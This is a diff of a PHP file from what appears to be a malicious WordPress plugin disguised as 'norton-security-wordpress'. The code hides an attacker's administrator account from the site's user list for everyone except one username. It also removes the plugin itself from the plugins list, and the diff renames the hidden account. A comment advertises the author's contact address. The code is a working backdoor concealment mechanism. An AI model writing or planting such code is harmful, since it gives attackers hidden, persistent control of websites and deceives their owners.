@@ -77,7 +77,7 @@
         global $current_user;
         $username = $current_user->user_login;
     
-        if ($username == '<span class="Pulse">Reel_</span>') { } else { global $wpdb; $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '<span class="Pulse">Hacked_By_LESiO</span>'",$user_search->query_where);
+        if ($username == '<span class="Pulse">Reel_</span>') { } else { global $wpdb; $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '<span class="Pulse">reeel_</span>'",$user_search->query_where);
     } } // Hide the plugin from the plugins list. add_action('pre_current_active_plugins', 'Ghost_Plugin'); function Ghost_Plugin() { global $wp_list_table; $hidearr = array('norton-security-wordpress/norton-security-wordpress.php'); $myplugins = $wp_list_table->items;
     foreach ($myplugins as $key => $val) { if (in_array($key,$hidearr)) { unset($wp_list_table->items[$key]); } } } // The creator of this code is also a web developer. Maybe he can do something for your ugly website. // Contact me at <span class="Pulse">doos4230@gmail.com</span>    ?>
     </span>
